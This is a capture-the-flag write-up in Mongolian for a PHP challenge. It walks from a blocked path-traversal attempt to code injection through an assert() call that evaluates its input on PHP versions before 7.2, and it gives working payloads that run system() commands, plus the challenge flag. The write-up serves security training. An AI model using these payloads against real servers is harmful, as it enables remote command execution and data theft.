
# Whole Lotta REaD

## **Хүндрэл:** Medium


## **Бодолт**  
Бодлогын нэр болон файл дуудаж буй байдлаас нэг зүйл анзаарагдана.
Бодлогын нэр : whole lotta REaD
Файл дуудаж буй байдал: http://domainame:5002/?file=file2.txt
LFI байх боломжтой гэдэг нь мэдэгдэж байна

### **1. i_am_music container**  
Эхний ээлжинд ямар нэг байдлаар өмнөх directory-д байрлах файлуудыг унших гэж оролдоё.
```
http://domainame:5002/?file=file2.txt/../../../flag.txt
```
Хариуд нь 
```php
**Warning**: assert(): assert("strpos('$file', '..') === false"): "strpos('file2.txt/../../../flag.txt', '..') === false" failed in **/var/www/html/index.php** on line **78**  
Hell no!
```
дээрх алдааны мессеж өгсөн бөгөөд шууд "../" ашиглаж path traversal хийж болохгүйгээр хамгаалсан байна.
### **2. Assert()**  
Хамгаалахдаа assert() функц ашиглан хамгаалсан байна . Гэхдээ  PHP 7.2-c өмнөх хувилбаруудад энэ функц эмзэг байдалтай байсан. assert функц нь дамжуулсан утгыг eval хийдэг буюу зүгээр нэг файл уншихыг хамгаалах биш RCE буюу  комманд ажиллуулах бүр ноцтой эмзэг байдлыг үүсгэж байна.
``

### **3. LFI2RCE**  
Алдааны мессежээр хайж үзвэл доорхтой төстэй rce payload олдоно.
```php
'and die(system("whoami")) or'
```
Үүнийг ажиллуулж үзвэл 
```
www-data www-data
```
буюу дээрх payload ажиллаж байна. Иймээс хүссэн коммандаа ажиллуулах боломжтой.
<br>Эцсийн payload:
```php
'and die(system("cat flag.txt")) or'
```
## **Туг:**  
    nest{FF0000_FF0000_FF0000_FF0000_FF0000}